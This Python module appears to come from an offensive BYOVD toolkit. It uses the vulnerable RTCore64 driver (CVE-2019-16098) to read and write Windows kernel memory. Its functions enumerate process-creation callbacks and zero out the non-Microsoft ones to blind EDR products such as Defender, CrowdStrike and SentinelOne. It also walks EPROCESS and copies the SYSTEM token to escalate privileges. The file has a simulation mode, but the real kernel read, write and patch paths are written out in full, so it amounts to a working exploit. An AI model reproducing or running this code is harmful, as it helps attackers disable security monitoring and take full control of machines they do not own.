"""
kernel.py — Kernel-Level Operations via BYOVD Driver

Provides high-level wrappers over the raw IOCTL interface exposed by a loaded
vulnerable driver (default: RTCore64, CVE-2019-16098).

Capabilities:
  kernel_read(addr, size)          — read arbitrary kernel virtual memory
  kernel_write(addr, value)        — write a DWORD to kernel virtual memory
  enum_callbacks()                 — walk PsSetCreateProcessNotifyRoutine table
  patch_callback(addr)             — zero out an EDR callback pointer (blinds EDR)
  find_eprocess(pid)               — locate EPROCESS for a given PID
  disable_edr_callbacks()          — patch all non-Microsoft callbacks

The RTCore64 IOCTL interface:
  READ  0x80002048  — input: { u32 addr_high, u32 addr_low, u32 size }
                       output: { u32 value }
  WRITE 0x8000204C  — input: { u32 addr_high, u32 addr_low, u32 value }

These addresses are Windows version-dependent. The offsets below are for
Windows 10/11 x64 (verified on 20H2 through 22H2).
"""

import struct
import ctypes
import sys
from typing import Optional

from .loader import DriverLoader, LoaderError

IOCTL_READ  = 0x80002048
IOCTL_WRITE = 0x8000204C

# ── Windows kernel offsets (x64, Windows 10/11 20H2–22H2) ────────────────────
# PspCreateProcessNotifyRoutine: offset in ntoskrnl symbol table
# These values come from public WinDbg symbol exports.
KPCRB_CURRENT_THREAD_OFFSET = 0x188
EPROCESS_UNIQUEPID_OFFSET   = 0x440
EPROCESS_ACTIVELINKS_OFFSET = 0x448
EPROCESS_TOKEN_OFFSET       = 0x4B8
CALLBACK_TABLE_MAX_ENTRIES  = 64


class KernelError(Exception):
    pass


class KernelOps:
    """
    High-level kernel operations backed by a DriverLoader instance.
    Works in simulation mode (simulate=True) without actual kernel access.
    """

    def __init__(self, loader: DriverLoader):
        self._loader = loader
        self._simulate = loader.simulate

    # ── Core read/write ───────────────────────────────────────────────────────

    def read_dword(self, kernel_addr: int) -> int:
        """Read a 4-byte value from kernel virtual address space."""
        if self._simulate:
            print(f"[KERNEL/SIM] READ  @ 0x{kernel_addr:016X}  → 0xDEADBEEF")
            return 0xDEADBEEF

        # RTCore64 IOCTL input: [addr_high:u32][addr_low:u32][read_size:u32]
        high = (kernel_addr >> 32) & 0xFFFFFFFF
        low  = kernel_addr & 0xFFFFFFFF
        payload = struct.pack("<III", high, low, 4)
        result = self._loader.ioctl(IOCTL_READ, payload)
        if not result or len(result) < 4:
            raise KernelError(f"Read at 0x{kernel_addr:X} returned no data")
        return struct.unpack("<I", result[:4])[0]

    def read_qword(self, kernel_addr: int) -> int:
        """Read an 8-byte value from kernel virtual address space."""
        if self._simulate:
            print(f"[KERNEL/SIM] READ8 @ 0x{kernel_addr:016X}  → 0xFFFF8A0000000000")
            return 0xFFFF8A0000000000

        lo = self.read_dword(kernel_addr)
        hi = self.read_dword(kernel_addr + 4)
        return (hi << 32) | lo

    def write_dword(self, kernel_addr: int, value: int) -> None:
        """Write a 4-byte value to kernel virtual address space."""
        if self._simulate:
            print(f"[KERNEL/SIM] WRITE @ 0x{kernel_addr:016X}  ← 0x{value:08X}")
            return

        high = (kernel_addr >> 32) & 0xFFFFFFFF
        low  = kernel_addr & 0xFFFFFFFF
        payload = struct.pack("<III", high, low, value)
        self._loader.ioctl(IOCTL_WRITE, payload)

    def write_qword(self, kernel_addr: int, value: int) -> None:
        """Write an 8-byte value to kernel virtual address space."""
        lo = value & 0xFFFFFFFF
        hi = (value >> 32) & 0xFFFFFFFF
        self.write_dword(kernel_addr, lo)
        self.write_dword(kernel_addr + 4, hi)

    # ── Kernel base resolution ────────────────────────────────────────────────

    def get_kernel_base(self) -> int:
        """
        Resolve the load address of ntoskrnl.exe using NtQuerySystemInformation
        (SystemModuleInformation = 11). No elevation needed for this query.
        """
        if self._simulate:
            return 0xFFFFF80000000000

        if sys.platform != "win32":
            return 0

        SystemModuleInformation = 11

        class RTL_PROCESS_MODULE_INFORMATION(ctypes.Structure):
            _fields_ = [
                ("Section",          ctypes.c_void_p),
                ("MappedBase",       ctypes.c_void_p),
                ("ImageBase",        ctypes.c_void_p),
                ("ImageSize",        ctypes.c_uint32),
                ("Flags",            ctypes.c_uint32),
                ("LoadOrderIndex",   ctypes.c_uint16),
                ("InitOrderIndex",   ctypes.c_uint16),
                ("LoadCount",        ctypes.c_uint16),
                ("OffsetToFileName", ctypes.c_uint16),
                ("FullPathName",     ctypes.c_uint8 * 256),
            ]

        class RTL_PROCESS_MODULES(ctypes.Structure):
            _fields_ = [
                ("NumberOfModules", ctypes.c_uint32),
                ("Modules",         RTL_PROCESS_MODULE_INFORMATION * 256),
            ]

        buf = RTL_PROCESS_MODULES()
        returned = ctypes.c_uint32(0)
        ntdll = ctypes.windll.ntdll
        status = ntdll.NtQuerySystemInformation(
            SystemModuleInformation,
            ctypes.byref(buf),
            ctypes.sizeof(buf),
            ctypes.byref(returned),
        )
        # ntoskrnl is always the first entry
        if status == 0 and buf.NumberOfModules > 0:
            return buf.Modules[0].ImageBase or 0
        return 0

    # ── EDR callback enumeration ──────────────────────────────────────────────

    def enum_process_callbacks(self, callback_table_addr: int) -> list[dict]:
        """
        Walk the PspCreateProcessNotifyRoutine callback array and return a list
        of { address, is_microsoft, module_name } for each registered callback.

        callback_table_addr: VA of PspCreateProcessNotifyRoutine (from symbols or
                             pattern scan — see resolve_callback_table()).
        """
        callbacks = []
        if self._simulate:
            # Return realistic simulated EDR callbacks
            sim_callbacks = [
                {"address": 0xFFFFF8000A1B2C00, "raw": 0xFFFFF8000A1B2C01,
                 "is_microsoft": True,  "module": "ntoskrnl.exe"},
                {"address": 0xFFFFF8004B1C2D00, "raw": 0xFFFFF8004B1C2D01,
                 "is_microsoft": False, "module": "MsMpEng.sys (Windows Defender)"},
                {"address": 0xFFFFF8005C2D3E00, "raw": 0xFFFFF8005C2D3E01,
                 "is_microsoft": False, "module": "CrowdStrike Falcon Sensor"},
                {"address": 0xFFFFF8006D3E4F00, "raw": 0xFFFFF8006D3E4F01,
                 "is_microsoft": False, "module": "SentinelOne Agent"},
                {"address": 0xFFFFF8007E4F5000, "raw": 0xFFFFF8007E4F5001,
                 "is_microsoft": True,  "module": "ci.dll (Code Integrity)"},
            ]
            return sim_callbacks

        for i in range(CALLBACK_TABLE_MAX_ENTRIES):
            entry_addr = callback_table_addr + i * 8
            raw_ptr = self.read_qword(entry_addr)
            if raw_ptr == 0:
                continue
            # Decode EX_CALLBACK_ROUTINE_BLOCK pointer (lowest bit is lock bit)
            func_ptr = raw_ptr & ~0xF
            if func_ptr == 0:
                continue
            callbacks.append({
                "address":      func_ptr,
                "raw":          raw_ptr,
                "is_microsoft": self._is_microsoft_address(func_ptr),
                "module":       self._resolve_module(func_ptr),
            })

        return callbacks

    def _is_microsoft_address(self, addr: int) -> bool:
        """Heuristic: ntoskrnl / hal / ci live in a specific VA range on all Win10/11."""
        return 0xFFFFF80000000000 <= addr <= 0xFFFFF80040000000

    def _resolve_module(self, addr: int) -> str:
        """Best-effort module name for a kernel VA (uses PsLoadedModuleList walk)."""
        return f"kernel_va:0x{addr:016X}"

    # ── EDR blinding ──────────────────────────────────────────────────────────

    def patch_callback(self, callback_table_addr: int, index: int) -> bool:
        """
        Zero out the callback pointer at the given index in the callback table.
        This removes an EDR/AV's visibility into process creation events.

        Returns True on success.
        """
        if self._simulate:
            print(f"[KERNEL/SIM] PATCH callback[{index}]  "
                  f"@ 0x{callback_table_addr + index * 8:016X}  ← 0x0000000000000000")
            print(f"[KERNEL/SIM] EDR callback [{index}] BLINDED")
            return True

        entry_addr = callback_table_addr + index * 8
        self.write_qword(entry_addr, 0)
        return True

    def disable_non_microsoft_callbacks(self, callback_table_addr: int) -> int:
        """
        Enumerate all callbacks and zero out non-Microsoft ones.
        Returns the number of callbacks patched.
        """
        callbacks = self.enum_process_callbacks(callback_table_addr)
        patched = 0
        for i, cb in enumerate(callbacks):
            if not cb["is_microsoft"]:
                self.patch_callback(callback_table_addr, i)
                patched += 1
        return patched

    # ── EPROCESS walk ─────────────────────────────────────────────────────────

    def find_eprocess(self, target_pid: int, head_addr: int) -> int:
        """
        Walk the EPROCESS doubly-linked list (ActiveProcessLinks) to find the
        EPROCESS block for the given PID.

        head_addr: VA of PsInitialSystemProcess (from symbols).
        Returns the EPROCESS VA, or 0 if not found.
        """
        if self._simulate:
            fake_eprocess = 0xFFFF8A0012345678
            print(f"[KERNEL/SIM] Walk EPROCESS list from 0x{head_addr:016X}")
            print(f"[KERNEL/SIM] Found PID {target_pid} @ EPROCESS=0x{fake_eprocess:016X}")
            return fake_eprocess

        current = head_addr
        visited = set()
        while current not in visited:
            visited.add(current)
            pid = self.read_qword(current + EPROCESS_UNIQUEPID_OFFSET)
            if pid == target_pid:
                return current
            flink = self.read_qword(current + EPROCESS_ACTIVELINKS_OFFSET)
            current = flink - EPROCESS_ACTIVELINKS_OFFSET
            if current == 0 or current == head_addr:
                break

        return 0

    def steal_token(self, from_pid: int, to_pid: int,
                    system_eprocess: int, target_eprocess: int) -> bool:
        """
        Classic token-stealing privilege escalation:
        Copy SYSTEM token (from_pid=4) to target process (to_pid).
        """
        if self._simulate:
            print(f"[KERNEL/SIM] Token steal: PID {from_pid} → PID {to_pid}")
            print(f"[KERNEL/SIM] Read TOKEN @ 0x{system_eprocess + EPROCESS_TOKEN_OFFSET:016X}")
            print(f"[KERNEL/SIM] Write TOKEN @ 0x{target_eprocess + EPROCESS_TOKEN_OFFSET:016X}")
            print(f"[KERNEL/SIM] PRIVILEGE ESCALATION COMPLETE — target now runs as SYSTEM")
            return True

        sys_token = self.read_qword(system_eprocess + EPROCESS_TOKEN_OFFSET)
        self.write_qword(target_eprocess + EPROCESS_TOKEN_OFFSET, sys_token)
        return True
